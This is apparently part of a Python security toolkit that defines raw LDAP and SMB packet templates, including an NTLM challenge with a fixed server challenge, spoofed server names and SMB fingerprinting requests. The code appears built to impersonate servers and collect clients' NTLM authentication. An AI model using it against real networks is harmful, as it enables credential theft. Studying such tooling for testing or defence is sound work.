        ("ParserHeadASNLen",         "\x00\x00\x00\x60"),#96
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x02"),
        ("OpHeadASNID",              "\x64"),
        ("OpHeadASNIDLenOfLen",      "\x84"),
        ("OpHeadASNIDLen",           "\x00\x00\x00\x57"),#87
        ("ObjectName",               "\x04\x00"),
        ("SearchAttribASNID",        "\x30"),
        ("SearchAttribASNLenOfLen",  "\x84"),
        ("SearchAttribASNLen",       "\x00\x00\x00\x4f"),#79
        ("SearchAttribASNID1",       "\x30"),
        ("SearchAttribASN1LenOfLen", "\x84"),
        ("SearchAttribASN1Len",      "\x00\x00\x00\x49"),#73
        ("SearchAttribASN2ID",       "\x04"),
        ("SearchAttribASN2Len",      "\x17"),#23
        ("SearchAttribASN2Str",      "supportedSASLMechanisms"),
        ("SearchAttribASN3ID",       "\x31"),
        ("SearchAttribASN3LenOfLen", "\x84"),
        ("SearchAttribASN3Len",      "\x00\x00\x00\x2a"),#42
        ("SearchAttrib1ASNID",       "\x04"),
        ("SearchAttrib1ASNLen",      "\x06"),#6
        ("SearchAttrib1ASNStr",      "GSSAPI"),
        ("SearchAttrib2ASNID",       "\x04"),
        ("SearchAttrib2ASNLen",      "\x0a"),#10
        ("SearchAttrib2ASNStr",      "GSS-SPNEGO"),
        ("SearchAttrib3ASNID",       "\x04"),
        ("SearchAttrib3ASNLen",      "\x08"),#8
        ("SearchAttrib3ASNStr",      "EXTERNAL"),
        ("SearchAttrib4ASNID",       "\x04"),
        ("SearchAttrib4ASNLen",      "\x0a"),#10
        ("SearchAttrib4ASNStr",      "DIGEST-MD5"),
        ("SearchDoneASNID",          "\x30"),
        ("SearchDoneASNLenOfLen",    "\x84"),
        ("SearchDoneASNLen",         "\x00\x00\x00\x10"),#16
        ("MessageIDASN2ID",          "\x02"),
        ("MessageIDASN2Len",         "\x01"),
        ("MessageIDASN2Str",         "\x02"),
        ("SearchDoneStr",            "\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00"),
        ## No need to calculate anything this time, this packet is generic.
    ])

class LDAPNTLMChallenge(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",                           "\x30"),
        ("ParserHeadASNLenOfLen",                     "\x84"),
        ("ParserHeadASNLen",                          "\x00\x00\x00\xD0"),#208
        ("MessageIDASNID",                            "\x02"),
        ("MessageIDASNLen",                           "\x01"),
        ("MessageIDASNStr",                           "\x02"),
        ("OpHeadASNID",                               "\x61"),
        ("OpHeadASNIDLenOfLen",                       "\x84"),
        ("OpHeadASNIDLen",                            "\x00\x00\x00\xc7"),#199
        ("Status",                                    "\x0A"),
        ("StatusASNLen",                              "\x01"),
        ("StatusASNStr",                              "\x0e"), #In Progress.
        ("MatchedDN",                                 "\x04\x00"), #Null
        ("ErrorMessage",                              "\x04\x00"), #Null
        ("SequenceHeader",                            "\x87"),
        ("SequenceHeaderLenOfLen",                    "\x81"),
        ("SequenceHeaderLen",                         "\x82"), #188
        ("NTLMSSPSignature",                          "NTLMSSP"),
        ("NTLMSSPSignatureNull",                      "\x00"),
        ("NTLMSSPMessageType",                        "\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen",                   "\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen",                "\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset",            "\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags",                   "\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge",                  "\x81\x22\x33\x34\x55\x46\xe7\x88"),
        ("NTLMSSPNtReserved",                         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen",                    "\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen",                 "\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset",             "\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh",     "\x05"),
        ("NegTokenInitSeqMechMessageVersionLow",      "\x02"),
        ("NegTokenInitSeqMechMessageVersionBuilt",    "\xce\x0e"),
        ("NegTokenInitSeqMechMessageVersionReserved", "\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType", "\x0f"),
        ("NTLMSSPNtWorkstationName",                  "SMB12"),
        ("NTLMSSPNTLMChallengeAVPairsId",             "\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen",            "\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr",     "smb12"),
        ("NTLMSSPNTLMChallengeAVPairs1Id",            "\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len",           "\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr",    "SERVER2008"),
        ("NTLMSSPNTLMChallengeAVPairs2Id",            "\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len",           "\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr",    "smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs3Id",            "\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len",           "\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr",    "SERVER2008.smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs5Id",            "\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len",           "\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr",    "smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs6Id",            "\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len",           "\x00\x00"),
    ])

    def calculate(self):

        ###### Convert strings to Unicode first
        self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')

        ###### Workstation Offset
        CalculateOffsetWorkstation = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])
        ###### AvPairs Offset
        CalculateLenAvpairs = str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])
        ###### LDAP Packet Len
        CalculatePacketLen = str(self.fields["MessageIDASNID"])+str(self.fields["MessageIDASNLen"])+str(self.fields["MessageIDASNStr"])+str(self.fields["OpHeadASNID"])+str(self.fields["OpHeadASNIDLenOfLen"])+str(self.fields["OpHeadASNIDLen"])+str(self.fields["Status"])+str(self.fields["StatusASNLen"])+str(self.fields["StatusASNStr"])+str(self.fields["MatchedDN"])+str(self.fields["ErrorMessage"])+str(self.fields["SequenceHeader"])+str(self.fields["SequenceHeaderLen"])+str(self.fields["SequenceHeaderLenOfLen"])+CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs
        OperationPacketLen = str(self.fields["Status"])+str(self.fields["StatusASNLen"])+str(self.fields["StatusASNStr"])+str(self.fields["MatchedDN"])+str(self.fields["ErrorMessage"])+str(self.fields["SequenceHeader"])+str(self.fields["SequenceHeaderLen"])+str(self.fields["SequenceHeaderLenOfLen"])+CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs
        NTLMMessageLen = CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs

        ##### LDAP Len Calculation:
        self.fields["ParserHeadASNLen"] = struct.pack(">i", len(CalculatePacketLen))
        self.fields["OpHeadASNIDLen"] = struct.pack(">i", len(OperationPacketLen))
        self.fields["SequenceHeaderLen"] = struct.pack(">B", len(NTLMMessageLen))
        ##### Workstation Offset Calculation:
        self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
        self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
        ##### IvPairs Offset Calculation:
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        ##### IvPair Calculation:
        self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))

##### SMB Packets #####
class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("errorcode", "\x00\x00\x00\x00"),
        ("flag1", "\x00"),
        ("flag2", "\x00\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x00\x00"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

class SMBNego(Packet):
    fields = OrderedDict([
        ("wordcount", "\x00"),
        ("bcc", "\x62\x00"),
        ("data", "")
    ])

    def calculate(self):
        self.fields["bcc"] = struct.pack("<h",len(str(self.fields["data"])))

class SMBNegoData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x00"),
        ("bcc", "\x54\x00"),
        ("separator1","\x02" ),
        ("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("separator2","\x02"),
        ("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
    ])

    def calculate(self):
        CalculateBCC  = str(self.fields["separator1"])+str(self.fields["dialect1"])
        CalculateBCC += str(self.fields["separator2"])+str(self.fields["dialect2"])
        self.fields["bcc"] = struct.pack("<h", len(CalculateBCC))

class SMBSessionData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0a"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00"),
        ("andxoffset", "\x00\x00"),
        ("maxbuff","\xff\xff"),
        ("maxmpx", "\x02\x00"),
        ("vcnum","\x01\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("PasswordLen","\x18\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("bcc","\x3b\x00"),
        ("AccountPassword",""),
        ("AccountName",""),
        ("AccountNameTerminator","\x00"),
        ("PrimaryDomain","WORKGROUP"),
        ("PrimaryDomainTerminator","\x00"),
        ("NativeOs","Unix"),
        ("NativeOsTerminator","\x00"),
        ("NativeLanman","Samba"),
        ("NativeLanmanTerminator","\x00"),

    ])
    def calculate(self):
        CompleteBCC = str(self.fields["AccountPassword"])+str(self.fields["AccountName"])+str(self.fields["AccountNameTerminator"])+str(self.fields["PrimaryDomain"])+str(self.fields["PrimaryDomainTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLanman"])+str(self.fields["NativeLanmanTerminator"])
        self.fields["bcc"] = struct.pack("<h", len(CompleteBCC))
        self.fields["PasswordLen"] = struct.pack("<h", len(str(self.fields["AccountPassword"])))

class SMBNegoFingerData(Packet):
    fields = OrderedDict([
        ("separator1","\x02" ),
        ("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("separator2","\x02"),
        ("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
        ("separator3","\x02"),
        ("dialect3", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00"),
        ("separator4","\x02"),
        ("dialect4", "\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"),
        ("separator5","\x02"),
        ("dialect5", "\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00"),
        ("separator6","\x02"),
        ("dialect6", "\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"),
    ])

class SMBSessionFingerData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\x00\x00"),
        ("maxbuff","\x04\x11"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x00\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x4a\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xd4\x00\x00\xa0"),
        ("bcc1",""),
        ("Data","\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x01\x28\x0a\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x33\x00\x20\x00\x32\x00\x36\x00\x30\x00\x30\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x00\x00"),

    ])
    def calculate(self):
        self.fields["bcc1"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]

class SMBTreeConnectData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x04"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("Andxoffset", "\x00\x00"),
        ("Flags","\x08\x00"),
        ("PasswdLen", "\x01\x00"),
        ("Bcc","\x1b\x00"),
        ("Passwd", "\x00"),
        ("Path",""),
        ("PathTerminator","\x00"),
        ("Service","?????"),
        ("Terminator", "\x00"),

    ])
    def calculate(self):
        self.fields["PasswdLen"] = struct.pack("<h", len(str(self.fields["Passwd"])))[:2]
        BccComplete = str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
        self.fields["Bcc"] = struct.pack("<h", len(BccComplete))

class RAPNetServerEnum3Data(Packet):
    fields = OrderedDict([
        ("Command", "\xd7\x00"),
        ("ParamDescriptor", "WrLehDzz"),
        ("ParamDescriptorTerminator", "\x00"),
        ("ReturnDescriptor","B16BBDz"),
        ("ReturnDescriptorTerminator", "\x00"),
        ("DetailLevel", "\x01\x00"),
        ("RecvBuff","\xff\xff"),
        ("ServerType", "\x00\x00\x00\x80"),
        ("TargetDomain","SMB"),
        ("RapTerminator","\x00"),
        ("TargetName","ABCD"),
        ("RapTerminator2","\x00"),
    ])

class SMBTransRAPData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x0e"),
        ("TotalParamCount", "\x24\x00"),
        ("TotalDataCount","\x00\x00" ),
        ("MaxParamCount", "\x08\x00"),
        ("MaxDataCount","\xff\xff"),
        ("MaxSetupCount", "\x00"),
        ("Reserved","\x00\x00"),
        ("Flags", "\x00"),
        ("Timeout","\x00\x00\x00\x00"),
        ("Reserved1","\x00\x00"),
        ("ParamCount","\x24\x00"),
        ("ParamOffset", "\x5a\x00"),
        ("DataCount", "\x00\x00"),
        ("DataOffset", "\x7e\x00"),
        ("SetupCount", "\x00"),
        ("Reserved2", "\x00"),
        ("Bcc", "\x3f\x00"),
        ("Terminator", "\x00"),
        ("PipeName", "\\PIPE\\LANMAN"),
        ("PipeTerminator","\x00\x00"),
        ("Data", ""),

    ])
    def calculate(self):
        #Padding
        if len(str(self.fields["Data"]))%2==0:
           self.fields["PipeTerminator"] = "\x00\x00\x00\x00"
        else:
           self.fields["PipeTerminator"] = "\x00\x00\x00"
        ##Convert Path to Unicode first before any Len calc.
        self.fields["PipeName"] = self.fields["PipeName"].encode('utf-16le')
        ##Data Len
        self.fields["TotalParamCount"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]
        self.fields["ParamCount"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]
        ##Packet len
        FindRAPOffset = str(self.fields["Wordcount"])+str(self.fields["TotalParamCount"])+str(self.fields["TotalDataCount"])+str(self.fields["MaxParamCount"])+str(self.fields["MaxDataCount"])+str(self.fields["MaxSetupCount"])+str(self.fields["Reserved"])+str(self.fields["Flags"])+str(self.fields["Timeout"])+str(self.fields["Reserved1"])+str(self.fields["ParamCount"])+str(self.fields["ParamOffset"])+str(self.fields["DataCount"])+str(self.fields["DataOffset"])+str(self.fields["SetupCount"])+str(self.fields["Reserved2"])+str(self.fields["Bcc"])+str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])
        self.fields["ParamOffset"] = struct.pack("<i", len(FindRAPOffset)+32)[:2]
        ##Bcc Buff Len
        BccComplete    = str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])+str(self.fields["Data"])
        self.fields["Bcc"] = struct.pack("<i", len(BccComplete))[:2]

class SMBNegoAnsLM(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("Maxbuffsize",  "\x04\x41\x00\x00"),
        ("Maxrawbuff",   "\x00\x00\x01\x00"),
        ("Sessionkey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfc\x3e\x01\x00"),
        ("Systemtime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("Srvtimezone",  "\x2c\x01"),
        ("Keylength",    "\x08"),
        ("Bcc",          "\x10\x00"),
        ("Key",          ""),
        ("Domain",       "SMB"),
        ("DomainNull",   "\x00\x00"),
        ("Server",       "SMB-TOOLKIT"),
        ("ServerNull",   "\x00\x00"),
    ])

    def calculate(self):
        self.fields["Domain"] = self.fields["Domain"].encode('utf-16le')
        self.fields["Server"] = self.fields["Server"].encode('utf-16le')
        CompleteBCCLen =  str(self.fields["Key"])+str(self.fields["Domain"])+str(self.fields["DomainNull"])+str(self.fields["Server"])+str(self.fields["ServerNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        self.fields["Keylength"] = struct.pack("<h",len(self.fields["Key"]))[0]

class SMBNegoAns(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("MaxBuffSize",  "\x04\x41\x00\x00"),
        ("MaxRawBuff",   "\x00\x00\x01\x00"),
        ("SessionKey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfd\xf3\x01\x80"),
        ("SystemTime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("SrvTimeZone",  "\xf0\x00"),
        ("KeyLen",    "\x00"),
        ("Bcc",          "\x57\x00"),
        ("Guid",         "\xc8\x27\x3d\xfb\xd4\x18\x55\x4f\xb2\x40\xaf\xd7\x61\x73\x75\x3b"),
        ("InitContextTokenASNId",     "\x60"),
        ("InitContextTokenASNLen",    "\x5b"),
        ("ThisMechASNId",             "\x06"),
        ("ThisMechASNLen",            "\x06"),
        ("ThisMechASNStr",            "\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          "\xA0"),
        ("SpNegoTokenASNLen",         "\x51"),
        ("NegTokenASNId",             "\x30"),
        ("NegTokenASNLen",            "\x4f"),
        ("NegTokenTag0ASNId",         "\xA0"),
        ("NegTokenTag0ASNLen",        "\x30"),
        ("NegThisMechASNId",          "\x30"),
        ("NegThisMechASNLen",         "\x2e"),
        ("NegThisMech4ASNId",         "\x06"),
        ("NegThisMech4ASNLen",        "\x09"),
        ("NegThisMech4ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         "\xA3"),
        ("NegTokenTag3ASNLen",        "\x1b"),
        ("NegHintASNId",              "\x30"),
        ("NegHintASNLen",             "\x19"),
        ("NegHintTag0ASNId",          "\xa0"),
        ("NegHintTag0ASNLen",         "\x17"),
        ("NegHintFinalASNId",         "\x1b"),
        ("NegHintFinalASNLen",        "\x15"),
        ("NegHintFinalASNStr",        "server2008$@SMB.LOCAL"),
    ])

    def calculate(self):
        CompleteBCCLen1 =  str(self.fields["Guid"])+str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])
        Tag3Len = str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen1))
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(AsnLenStart))
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(str(self.fields["ThisMechASNStr"])))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMechASNLen"] = struct.pack("<B", len(MechTypeLen)-2)
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintTag0ASNLen"] = struct.pack("<B", len(Tag3Len)-4)
        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(str(self.fields["NegHintFinalASNStr"])))

class SMBNegoKerbAns(Packet):
    fields = OrderedDict([
        ("Wordcount",                "\x11"),
        ("Dialect",                  ""),
        ("Securitymode",             "\x03"),
        ("MaxMpx",                   "\x32\x00"),
        ("MaxVc",                    "\x01\x00"),
        ("MaxBuffSize",              "\x04\x41\x00\x00"),
        ("MaxRawBuff",               "\x00\x00\x01\x00"),
        ("SessionKey",               "\x00\x00\x00\x00"),
        ("Capabilities",             "\xfd\xf3\x01\x80"),
        ("SystemTime",               "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("SrvTimeZone",               "\xf0\x00"),
        ("KeyLen",                    "\x00"),
        ("Bcc",                       "\x57\x00"),
        ("Guid",                      "\xc8\x27\x3d\xfb\xd4\x18\x55\x4f\xb2\x40\xaf\xd7\x61\x73\x75\x3b"),
        ("InitContextTokenASNId",     "\x60"),
        ("InitContextTokenASNLen",    "\x5b"),
        ("ThisMechASNId",             "\x06"),
        ("ThisMechASNLen",            "\x06"),
        ("ThisMechASNStr",            "\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          "\xA0"),
        ("SpNegoTokenASNLen",         "\x51"),
        ("NegTokenASNId",             "\x30"),
